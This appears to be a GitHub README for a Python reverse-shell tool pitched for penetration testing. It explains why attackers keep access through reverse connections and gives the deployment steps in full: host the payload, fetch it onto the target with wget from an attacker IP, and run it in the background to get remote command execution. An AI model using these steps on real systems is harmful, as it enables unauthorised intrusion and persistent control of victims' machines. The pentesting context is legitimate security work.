# Reverse-Shell
Python reverse shell that can be used during a penetration test.

# Background
After exploitng a machine the attacker needs a way to get access to the machine even after the vulnerability used bythe attacker is fixed. These scenario the attacker uses a reverse connection. By default most enterprise firewalls will block outside connection from connecting into the network, hence the attacker will have to get the target to connect to them using a reverse connection. The reverse shell above is composed of socket and relies onthe TCP protocol which is connection oriented. Socket is an API that allow programs to communicate over a network.
The reverse shell consists of two parts:

    a)Ability to connect to the attacker machine.
    b)Allows an attacker to execute terminal commands on a victim machine.

Accessing victim machine can be archived by carrying out reccon to identify open ports and services running onthem, then looking for exploits for this services. When an attacker gets an exploit to leverage a vulnerability onthe target they send malicious packets to the processes hosted onthe port and possibly compromise the system.

#Using the payload Above
Host the payload on a server using

    kali> python3 -m http.server 8080
![pythonhttp server](https://github.com/user-attachments/assets/8739c333-18d8-4247-b90f-b8eb093cb8f0)

Then use the wget command to download the payload onto the system from the server

    kali> wget 192.168.1.100:8080/reverseShell.py
![delivery](https://github.com/user-attachments/assets/dc80e3f0-4619-4098-96cf-d98c94342d67)

Start the server on the attacker machine using

    kali> python3 server.py

Then execute the reverse shell onthe hacker

    kali> python reserseShell.py 192.168.1.100 &                      Note: The & operator in bash is used to background a process.
![execute on target](https://github.com/user-attachments/assets/c9740c2c-33bd-4d0c-ba5e-ecddd269becc)

Now onthe Kali machine we get a connection onto our server allowing us to execute system commands onthe compromised system.
![c c](https://github.com/user-attachments/assets/ac832b50-3c46-44e2-adc8-e7a062bd69b7)


